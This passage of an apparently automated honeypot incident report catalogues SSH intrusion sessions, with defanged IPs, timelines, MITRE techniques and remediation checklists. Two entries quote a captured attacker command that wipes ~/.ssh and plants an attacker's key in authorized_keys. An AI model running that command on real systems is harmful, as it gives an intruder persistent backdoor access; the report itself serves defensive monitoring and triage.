| `2026-08-04 18:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.22[.]154` to AbuseIPDB if not already reported
- [ ] Block `111.70.22[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8480b1d826a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:12 |
| **Last Seen** | 2026-08-04 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:12:16` | `cowrie.session.connect` |
| `2026-08-04 18:12:16` | `cowrie.client.version` |
| `2026-08-04 18:12:16` | `cowrie.client.kex` |
| `2026-08-04 18:12:16` | `cowrie.login.success` |
| `2026-08-04 18:12:17` | `cowrie.session.params` |
| `2026-08-04 18:12:17` | `cowrie.command.input` |
| `2026-08-04 18:12:17` | `cowrie.log.closed` |
| `2026-08-04 18:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-890940b65c7b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:14 |
| **Last Seen** | 2026-08-04 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:14:19` | `cowrie.session.connect` |
| `2026-08-04 18:14:19` | `cowrie.client.version` |
| `2026-08-04 18:14:19` | `cowrie.client.kex` |
| `2026-08-04 18:14:20` | `cowrie.login.success` |
| `2026-08-04 18:14:20` | `cowrie.session.params` |
| `2026-08-04 18:14:20` | `cowrie.command.input` |
| `2026-08-04 18:14:21` | `cowrie.log.closed` |
| `2026-08-04 18:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a08a445794e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:16 |
| **Last Seen** | 2026-08-04 18:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:16:18` | `cowrie.session.connect` |
| `2026-08-04 18:16:18` | `cowrie.client.version` |
| `2026-08-04 18:16:18` | `cowrie.client.kex` |
| `2026-08-04 18:16:19` | `cowrie.login.success` |
| `2026-08-04 18:16:20` | `cowrie.session.params` |
| `2026-08-04 18:16:20` | `cowrie.command.input` |
| `2026-08-04 18:16:20` | `cowrie.log.closed` |
| `2026-08-04 18:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1e6ef27cd25

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]19` |
| **First Seen** | 2026-08-04 18:18 |
| **Last Seen** | 2026-08-04 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:18:07` | `cowrie.session.connect` |
| `2026-08-04 18:18:07` | `cowrie.client.version` |
| `2026-08-04 18:18:07` | `cowrie.client.kex` |
| `2026-08-04 18:18:08` | `cowrie.login.success` |
| `2026-08-04 18:18:08` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:18:08` | `cowrie.direct-tcpip.data` |
| `2026-08-04 18:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]19` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5600b4be1ea2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:18 |
| **Last Seen** | 2026-08-04 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:18:15` | `cowrie.session.connect` |
| `2026-08-04 18:18:15` | `cowrie.client.version` |
| `2026-08-04 18:18:15` | `cowrie.client.kex` |
| `2026-08-04 18:18:16` | `cowrie.login.success` |
| `2026-08-04 18:18:16` | `cowrie.session.params` |
| `2026-08-04 18:18:16` | `cowrie.command.input` |
| `2026-08-04 18:18:16` | `cowrie.log.closed` |
| `2026-08-04 18:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63280aaefd0c

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-04 18:19 |
| **Last Seen** | 2026-08-04 18:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:19:11` | `cowrie.session.connect` |
| `2026-08-04 18:19:11` | `cowrie.client.version` |
| `2026-08-04 18:19:11` | `cowrie.client.kex` |
| `2026-08-04 18:19:11` | `cowrie.login.success` |
| `2026-08-04 18:19:12` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:19:12` | `cowrie.direct-tcpip.data` |
| `2026-08-04 18:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f8372cef83

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:20 |
| **Last Seen** | 2026-08-04 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:20:16` | `cowrie.session.connect` |
| `2026-08-04 18:20:16` | `cowrie.client.version` |
| `2026-08-04 18:20:16` | `cowrie.client.kex` |
| `2026-08-04 18:20:17` | `cowrie.login.success` |
| `2026-08-04 18:20:17` | `cowrie.session.params` |
| `2026-08-04 18:20:17` | `cowrie.command.input` |
| `2026-08-04 18:20:17` | `cowrie.log.closed` |
| `2026-08-04 18:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ece83d1618c7

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]199` |
| **First Seen** | 2026-08-04 18:20 |
| **Last Seen** | 2026-08-04 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:20:33` | `cowrie.session.connect` |
| `2026-08-04 18:20:33` | `cowrie.login.success` |
| `2026-08-04 18:20:34` | `cowrie.session.params` |
| `2026-08-04 18:20:34` | `cowrie.command.input` |
| `2026-08-04 18:20:34` | `cowrie.log.closed` |
| `2026-08-04 18:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]199` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f76a246dee9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-04 18:22 |
| **Last Seen** | 2026-08-04 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:22:04` | `cowrie.session.connect` |
| `2026-08-04 18:22:04` | `cowrie.client.version` |
| `2026-08-04 18:22:04` | `cowrie.client.kex` |
| `2026-08-04 18:22:05` | `cowrie.login.success` |
| `2026-08-04 18:22:05` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:22:05` | `cowrie.direct-tcpip.data` |
| `2026-08-04 18:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a941b4b9774

| Field | Detail |
|---|---|
| **Source IP** | `60.172.41[.]103` |
| **First Seen** | 2026-08-04 18:22 |
| **Last Seen** | 2026-08-04 18:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:22:21` | `cowrie.session.connect` |
| `2026-08-04 18:22:22` | `cowrie.client.version` |
| `2026-08-04 18:22:22` | `cowrie.client.kex` |
| `2026-08-04 18:22:24` | `cowrie.login.success` |
| `2026-08-04 18:22:25` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.41[.]103` to AbuseIPDB if not already reported
- [ ] Block `60.172.41[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5447072f5ea

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-08-04 18:38 |
| **Last Seen** | 2026-08-04 18:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:38:11` | `cowrie.session.connect` |
| `2026-08-04 18:38:11` | `cowrie.client.version` |
| `2026-08-04 18:38:11` | `cowrie.client.kex` |
| `2026-08-04 18:38:12` | `cowrie.login.success` |
| `2026-08-04 18:38:14` | `cowrie.session.params` |
| `2026-08-04 18:38:14` | `cowrie.command.input` |
| `2026-08-04 18:38:14` | `cowrie.command.failed` |
| `2026-08-04 18:38:14` | `cowrie.log.closed` |
| `2026-08-04 18:38:15` | `cowrie.session.params` |
| `2026-08-04 18:38:15` | `cowrie.command.input` |
| `2026-08-04 18:38:15` | `cowrie.session.file_download` |
| `2026-08-04 18:38:15` | `cowrie.log.closed` |
| `2026-08-04 18:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2622cb078309

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-08-04 18:38 |
| **Last Seen** | 2026-08-04 18:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:38:16` | `cowrie.session.connect` |
| `2026-08-04 18:38:16` | `cowrie.client.version` |
| `2026-08-04 18:38:16` | `cowrie.client.kex` |
| `2026-08-04 18:38:17` | `cowrie.login.success` |
| `2026-08-04 18:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d1f5b45906

| Field | Detail |
|---|---|
| **Source IP** | `92.207.4[.]157` |
| **First Seen** | 2026-08-04 18:38 |
| **Last Seen** | 2026-08-04 18:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:38:17` | `cowrie.session.connect` |
| `2026-08-04 18:38:17` | `cowrie.client.version` |
| `2026-08-04 18:38:17` | `cowrie.client.kex` |
| `2026-08-04 18:38:17` | `cowrie.login.success` |
| `2026-08-04 18:38:18` | `cowrie.session.params` |
| `2026-08-04 18:38:18` | `cowrie.command.input` |
| `2026-08-04 18:38:18` | `cowrie.command.failed` |
| `2026-08-04 18:38:18` | `cowrie.log.closed` |
| `2026-08-04 18:38:19` | `cowrie.session.params` |
| `2026-08-04 18:38:19` | `cowrie.command.input` |
| `2026-08-04 18:38:19` | `cowrie.session.file_download` |
| `2026-08-04 18:38:19` | `cowrie.log.closed` |
| `2026-08-04 18:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.207.4[.]157` to AbuseIPDB if not already reported
- [ ] Block `92.207.4[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d31b13f92292

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-08-04 18:38 |
| **Last Seen** | 2026-08-04 18:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:38:18` | `cowrie.session.connect` |
| `2026-08-04 18:38:18` | `cowrie.client.version` |
| `2026-08-04 18:38:19` | `cowrie.client.kex` |
| `2026-08-04 18:38:20` | `cowrie.login.success` |
| `2026-08-04 18:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d82db5fda6d1

| Field | Detail |
|---|---|
| **Source IP** | `92.207.4[.]157` |
| **First Seen** | 2026-08-04 18:38 |
| **Last Seen** | 2026-08-04 18:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:38:19` | `cowrie.session.connect` |
| `2026-08-04 18:38:19` | `cowrie.client.version` |
| `2026-08-04 18:38:19` | `cowrie.client.kex` |
| `2026-08-04 18:38:20` | `cowrie.login.success` |
| `2026-08-04 18:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.207.4[.]157` to AbuseIPDB if not already reported
- [ ] Block `92.207.4[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02871f90d5f

| Field | Detail |
|---|---|
| **Source IP** | `92.207.4[.]157` |
| **First Seen** | 2026-08-04 18:38 |
| **Last Seen** | 2026-08-04 18:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:38:20` | `cowrie.session.connect` |
| `2026-08-04 18:38:20` | `cowrie.client.version` |
| `2026-08-04 18:38:20` | `cowrie.client.kex` |
| `2026-08-04 18:38:21` | `cowrie.login.success` |
| `2026-08-04 18:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.207.4[.]157` to AbuseIPDB if not already reported
- [ ] Block `92.207.4[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e5095782a5

| Field | Detail |
|---|---|
| **Source IP** | `207.254.22[.]207` |
| **First Seen** | 2026-08-04 18:39 |
| **Last Seen** | 2026-08-04 18:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:39:25` | `cowrie.session.connect` |
| `2026-08-04 18:39:25` | `cowrie.client.version` |
| `2026-08-04 18:39:25` | `cowrie.client.kex` |
| `2026-08-04 18:39:26` | `cowrie.login.success` |
| `2026-08-04 18:39:26` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.22[.]207` to AbuseIPDB if not already reported
- [ ] Block `207.254.22[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b79383c127b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 18:41 |
| **Last Seen** | 2026-08-04 18:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:41:17` | `cowrie.session.connect` |
| `2026-08-04 18:41:17` | `cowrie.client.version` |
| `2026-08-04 18:41:17` | `cowrie.client.kex` |
| `2026-08-04 18:41:17` | `cowrie.login.success` |
| `2026-08-04 18:41:17` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:41:17` | `cowrie.direct-tcpip.data` |
| `2026-08-04 18:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b09162a2639

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-04 18:43 |
| **Last Seen** | 2026-08-04 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:43:25` | `cowrie.session.connect` |
| `2026-08-04 18:43:25` | `cowrie.client.version` |
| `2026-08-04 18:43:25` | `cowrie.client.kex` |
| `2026-08-04 18:43:25` | `cowrie.login.success` |
| `2026-08-04 18:43:26` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:43:26` | `cowrie.direct-tcpip.data` |
| `2026-08-04 18:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3521537022b4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]223` |
| **First Seen** | 2026-08-04 18:47 |
| **Last Seen** | 2026-08-04 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:47:31` | `cowrie.session.connect` |
| `2026-08-04 18:47:31` | `cowrie.client.version` |
| `2026-08-04 18:47:31` | `cowrie.client.kex` |
| `2026-08-04 18:47:31` | `cowrie.login.success` |
| `2026-08-04 18:47:32` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:47:32` | `cowrie.direct-tcpip.data` |
| `2026-08-04 18:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76cc9788d93c

| Field | Detail |
|---|---|
| **Source IP** | `117.158.160[.]42` |
| **First Seen** | 2026-08-04 18:51 |
| **Last Seen** | 2026-08-04 18:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:51:42` | `cowrie.session.connect` |
| `2026-08-04 18:51:43` | `cowrie.client.version` |
| `2026-08-04 18:51:43` | `cowrie.client.kex` |
| `2026-08-04 18:51:45` | `cowrie.login.success` |
| `2026-08-04 18:51:45` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `117.158.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6087a565eb

| Field | Detail |
|---|---|
| **Source IP** | `122.187.226[.]21` |
| **First Seen** | 2026-08-04 18:51 |
| **Last Seen** | 2026-08-04 18:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:51:55` | `cowrie.session.connect` |
| `2026-08-04 18:51:56` | `cowrie.client.version` |
| `2026-08-04 18:51:56` | `cowrie.client.kex` |
| `2026-08-04 18:51:58` | `cowrie.login.success` |
| `2026-08-04 18:51:58` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.226[.]21` to AbuseIPDB if not already reported
- [ ] Block `122.187.226[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed6a2dc1cdc8

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]225` |
| **First Seen** | 2026-08-04 18:53 |
| **Last Seen** | 2026-08-04 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:53:07` | `cowrie.session.connect` |
| `2026-08-04 18:53:07` | `cowrie.client.version` |
| `2026-08-04 18:53:07` | `cowrie.client.kex` |
| `2026-08-04 18:53:07` | `cowrie.login.success` |
| `2026-08-04 18:53:07` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:53:08` | `cowrie.direct-tcpip.data` |
| `2026-08-04 18:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]225` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `88.214.25[.]125` | **6** | 2026-08-04 17:41 | 2026-08-04 18:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-04 16:57 | 2026-08-04 18:41 | 0m | 0 | `T1592` | 🟢 LOW |
